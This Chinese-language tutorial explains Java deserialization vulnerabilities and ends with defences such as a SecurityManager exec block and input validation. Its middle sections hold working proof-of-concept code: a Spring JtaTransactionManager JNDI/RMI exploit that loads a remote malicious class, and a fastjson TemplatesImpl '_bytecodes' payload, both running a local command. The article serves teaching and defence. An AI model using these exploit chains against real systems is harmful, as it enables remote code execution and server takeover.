---
title: 序列化(3)-序列化漏洞
headerDepth: 4
order: 17
---

### 一、背景
熟悉接口开发的同学一定知道，能将数据对象很轻松的实现多平台之间的通信、对象持久化存储，序列化和反序列化是一种非常有效的手段，例如如下应用场景，对象必须 100% 实现序列化。

+ DUBBO：对象传输必须要实现序列化
+ RMI：Java 的一组拥护开发分布式应用程序 API，实现了不同操作系统之间程序的方法调用，RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是 1099 端口

而在反序列化的背后，却隐藏了很多不为人知的秘密！

最为出名的大概应该是：15年的 Apache Commons Collections 反序列化远程命令执行漏洞，当初影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMSd 等知名软件，直接在互联网行业掀起了一阵飓风。

2016 年 Spring RMI 反序列化爆出漏洞，攻击者可以通过 JtaTransactionManager 这个类，来远程执行恶意代码。

2017 年 4月15 日，Jackson 框架被发现存在一个反序列化代码执行漏洞。该漏洞存在于 Jackson 框架下的 enableDefaultTyping 方法，通过该漏洞，攻击者可以远程在服务器主机上越权执行任意代码，从而取得该网站服务器的控制权。

还有 fastjson，一款 java 编写的高性能功能非常完善的 JSON 库，应用范围非常广，在 2017 年，fastjson 官方主动爆出 fastjson 在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。

Java 十分受开发者喜爱的一点，就是其拥有完善的第三方类库，和满足各种需求的框架。但正因为很多第三方类库引用广泛，如果其中某些组件出现安全问题，或者在数据校验入口就没有把关好，那么受影响范围将极为广泛的，以上爆出的漏洞，可能只是星辰大海中的一束花。

那么问题来了，攻击者是如何精心构造反序列化对象并执行恶意代码的呢？

### 二、漏洞分析
#### 2.1、漏洞基本原理
先看一段代码如下：

```java
public class DemoSerializable {

    public static void main(String[] args) throws Exception {
        //定义myObj对象
        MyObject myObj = new MyObject();
        myObj.name = "hello world";
        //创建一个包含对象进行反序列化信息的”object”数据文件
        FileOutputStream fos = new FileOutputStream("object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将myObj对象写入object文件
        os.writeObject(myObj);
        os.close();
        //从文件中反序列化obj对象
        FileInputStream fis = new FileInputStream("object");
        ObjectInputStream ois = new ObjectInputStream(fis);
        //恢复对象
        MyObject objectFromDisk = (MyObject)ois.readObject();
        System.out.println(objectFromDisk.name);
        ois.close();
    }
}

class MyObject implements Serializable {

    /**
     * 任意属性
     */
    public String name;


    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行指定程序
        Runtime.getRuntime().exec("open https://www.baidu.com/");
    }
}
```

运行程序之后，控制台会输出hello world，同时也会打开网页跳转到https://www.baidu.com/。

从这段逻辑中分析，可以很清晰的看到反序列化已经成功了，但是程序又偷偷的执行了一段如下代码。

```java
Runtime.getRuntime().exec("open https://www.baidu.com/");
```

可以再把这段代码改造一下，内容如下：

```java
//mac系统，执行打开计算器程序命令
Runtime.getRuntime().exec("open /Applications/Calculator.app/");

//windows系统，执行打开计算器程序命令
Runtime.getRuntime().exec("calc.exe");
```

运行程序后，可以很轻松的打开电脑中已有的任意程序。

很多人可能不知道，这里的`readObject()`是可以重写的，只是`Serializable`接口没有显示的把它展示出来，`readObject()`方法的作用是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，以定制反序列化的一些行为。

可能有的同学会说，实际开发过程中，不会有人这么去重写`readObject()`方法，当然不会，但是实际情况也不会太差。

#### 2.2、Spring 框架的反序列化漏洞
以当时的 Spring 框架爆出的反序列化漏洞为例，请看当时的示例代码。

首先创建一个 server 代码：

```java
public class ExploitableServer {

    public static void main(String[] args) {
        try {
            //创建socket
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt("9999"));
            System.out.println("Server started on port "+serverSocket.getLocalPort());
            while(true) {
                //等待链接
                Socket socket=serverSocket.accept();
                System.out.println("Connection received from "+socket.getInetAddress());
                ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());
                try {
                    //读取对象
                    Object object = objectInputStream.readObject();
                    System.out.println("Read object "+object);
                } catch(Exception e) {
                    System.out.println("Exception caught while reading object");
                    e.printStackTrace();
                }
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

然后创建一个 client 代码：

```java
public class ExploitClient {

    public static void main(String[] args) {
        try {
            String serverAddress = "127.0.0.1";
            int port = Integer.parseInt("1234");
            String localAddress= "127.0.0.1";

            System.out.println("Starting HTTP server");   //开启8080端口服务
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(8080), 0);
            httpServer.createContext("/",new HttpFileHandler());
            httpServer.setExecutor(null);
            httpServer.start();

            System.out.println("Creating RMI Registry"); //绑定RMI服务到 1099端口 Object  提供恶意类的RMI服务
            Registry registry = LocateRegistry.createRegistry(1099);
            /*
            java为了将object对象存储在Naming或者Directory服务下，
            提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming和Directory服务下，
            比如（rmi，ldap等）。在使用Reference的时候，可以直接把对象写在构造方法中，
            当被调用的时候，对象的方法就会被触发。理解了jndi和jndi reference后，
            就可以理解jndi注入产生的原因了。
             */ //绑定本地的恶意类到1099端口
            Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://"+serverAddress+":8080"+"/");
            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
            registry.bind("Object", referenceWrapper);

            System.out.println("Connecting to server "+serverAddress+":"+port); //连接服务器1234端口
            Socket socket=new Socket(serverAddress,port);
            System.out.println("Connected to server");
            String jndiAddress = "rmi://"+localAddress+":1099/Object";

            //JtaTransactionManager 反序列化时的readObject方法存在问题 //使得setUserTransactionName可控，远程加载恶意类
            //lookup方法会实例化恶意类，导致执行恶意类无参的构造方法
            org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
            object.setUserTransactionName(jndiAddress);
            //上面就是poc,下面是将object序列化发送给服务器，服务器访问恶意类
            System.out.println("Sending object to server...");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
            objectOutputStream.writeObject(object);
            objectOutputStream.flush();
            while(true) {
                Thread.sleep(1000);
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

最后，创建一个`ExportObject`需要远程下载的类：

```java
public class ExportObject {

    public static String exec(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null)
            sb += lineStr + "\n";
        inBr.close();
        in.close();
        return sb;
    }
    public ExportObject() throws Exception {
        String cmd="open /Applications/Calculator.app/";
        throw new Exception(exec(cmd));
    }
}
```

先开启 server，再运行 client 后，计算器会直接被打开！

究其原因，主要是这个类`JtaTransactionManager`类存在问题，最终导致了漏洞的实现。 源码JtaTransactionManager类重写了`readObject`方法。 重点就是方法`initUserTransactionAndTransactionManager()`， 里面会转调用到`JndiTemplate`的`lookup()`方法。

`lookup()`方法作用是：Look up the object with the given name in the current JNDI context。

也就是说，通过`JtaTransactionManager`类的`setUserTransactionName()`方法执行，最终指向了`rmi://127.0.0.1:1099/Object`，导致服务执行了恶意类的远程代码。

#### 2.3、FASTJSON 框架的反序列化漏洞分析
先来看一个简单的例子，程序代码如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class Test extends AbstractTranslet {
    
    public Test() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app/");
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {
    }


    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
```

运行程序之后，同样的直接会打开电脑中的计算器。

恶意代码植入的核心就是在对象初始化阶段，直接会调用`Runtime.getRuntime().exec("open /Applications/Calculator.app/")`这个方法，通过运行时操作类直接执行恶意代码。

在来看看下面这个例子：

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;


public class POC {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        final String evilClassPath = System.getProperty("user.dir") + "/target/classes/person/Test.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);

        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());
    }
    public static void main(String args[]){
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

在这个程序验证代码中，最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，
而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。

_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，所以是设置不了的，只能依赖于jdk的实现，某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。

如果使用的jdk版本是1.7，并且fastjson <= 1.2.24，基本会执行成功，如果是高版本的，可能会报错！

详细分析请移步：[http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/](http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/)

Jackson 的反序列化漏洞也与之类似。

### 三、如何防范
从上面的案例看，java 的序列化和反序列化，单独使用的并没有啥毛病，核心问题也都不是反序列化，但都是因为反序列化导致了恶意代码被执行了，尤其是两个看似安全的组件，如果在同一系统中交叉使用，也能会带来一定安全问题。

#### 3.1、禁止 JVM 执行外部命令 `Runtime.exec`
从上面的代码中，不难发现，恶意代码最终都是通过Runtime.exec这个方法得到执行，因此可以从 JVM 层面禁止外部命令的执行。

通过扩展 SecurityManager 可以实现：

```java
public class SecurityManagerTest {

    public static void main(String[] args) {
        SecurityManager originalSecurityManager = System.getSecurityManager();
        if (originalSecurityManager == null) {
            // 创建自己的SecurityManager
            SecurityManager sm = new SecurityManager() {
                private void check(Permission perm) {
                    // 禁止exec
                    if (perm instanceof java.io.FilePermission) {
                        String actions = perm.getActions();
                        if (actions != null && actions.contains("execute")) {
                            throw new SecurityException("execute denied!");
                        }
                    }
                    // 禁止设置新的SecurityManager，保护自己
                    if (perm instanceof java.lang.RuntimePermission) {
                        String name = perm.getName();
                        if (name != null && name.contains("setSecurityManager")) {
                            throw new SecurityException("System.setSecurityManager denied!");
                        }
                    }
                }

                @Override
                public void checkPermission(Permission perm) {
                    check(perm);
                }

                @Override
                public void checkPermission(Permission perm, Object context) {
                    check(perm);
                }
            };

            System.setSecurityManager(sm);
        }
    }
}
```

只要在 Java 代码里简单加上面那一段，就可以禁止执行外部程序了，但是并非禁止外部程序执行，Java 程序就安全了，有时候可能适得其反，因为执行权限被控制太苛刻了，不见得是个好事，还得想其他招数。

#### 3.2、增加多层数据校验
比较有效的办法是，当把接口参数暴露出去之后，服务端要及时做好数据参数的验证，尤其是那种带有`http`、`https`、`rmi`等这种类型的参数过滤验证，可以进一步降低服务的风险。

### 四、小结
随着 Json 数据交换格式的普及，直接应用在服务端的反序列化接口也随之减少，但陆续爆出的Jackson和Fastjson两大 Json 处理库的反序列化漏洞，也暴露出了一些问题。

所以在日常业务开发的时候，对于 Java 反序列化的安全问题应该具备一定的防范意识，并着重注意传入数据的校验、服务器权限和相关日志的检查， API 权限控制，通过 HTTPS 加密传输数据等方面进行下功夫，以免造成不必要的损失！

